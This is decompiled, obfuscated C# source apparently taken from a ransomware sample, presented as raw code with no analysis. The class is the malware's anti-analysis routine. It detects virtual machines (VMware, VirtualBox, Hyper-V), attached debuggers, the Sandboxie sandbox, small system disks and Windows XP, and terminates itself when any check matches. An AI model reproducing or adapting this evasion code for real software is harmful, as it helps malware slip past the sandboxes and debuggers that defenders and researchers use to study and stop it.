// Decompiled with JetBrains decompiler
// Type: kuMeqwHpurUBOD.zMTntIYuuvYev
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3332F4B9-4EB1-4ECC-A637-16FC36F853D6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.Win32.Generic-936a35ca214e9be1438c67a1153c854c28054994ce43f1eed39bb9dc52cb54dd.exe

using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;

namespace kuMeqwHpurUBOD
{
  internal class zMTntIYuuvYev
  {
    public static void jCyJrDoNBUe()
    {
      if (zMTntIYuuvYev.dSfxbOheLvgz() || zMTntIYuuvYev.qxpdkNrzJxihoG() || zMTntIYuuvYev.OFzxBGugyQ() || zMTntIYuuvYev.YMjxastlyJ() || zMTntIYuuvYev.xgUyHTlEpJqKTHF())
        Process.GetCurrentProcess().Kill();
      Environment.FailFast((string) null);
    }

    private static bool YMjxastlyJ()
    {
      try
      {
        long num = 61000000000;
        if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool xgUyHTlEpJqKTHF()
    {
      try
      {
        if (new ComputerInfo().OSFullName.ToLower().Contains("xp"))
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool dSfxbOheLvgz()
    {
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              string lower = managementBaseObject["Manufacturer"].ToString().ToLower();
              if (lower == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL") || lower.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
                return true;
            }
          }
        }
      }
      catch
      {
      }
      return false;
    }

    private static bool qxpdkNrzJxihoG()
    {
      bool flag = false;
      try
      {
        zMTntIYuuvYev.imhRJCzyOnb(Process.GetCurrentProcess().Handle, ref flag);
        return flag;
      }
      catch
      {
        return flag;
      }
    }

    private static bool OFzxBGugyQ()
    {
      try
      {
        return zMTntIYuuvYev.nMSwRSOyBwJrC("SbieDll.dll").ToInt32() != 0;
      }
      catch
      {
        return false;
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
    public static extern IntPtr nMSwRSOyBwJrC([In] string obj0);

    [DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", SetLastError = true)]
    private static extern bool imhRJCzyOnb([In] IntPtr obj0, [In] ref bool obj1);
  }
}
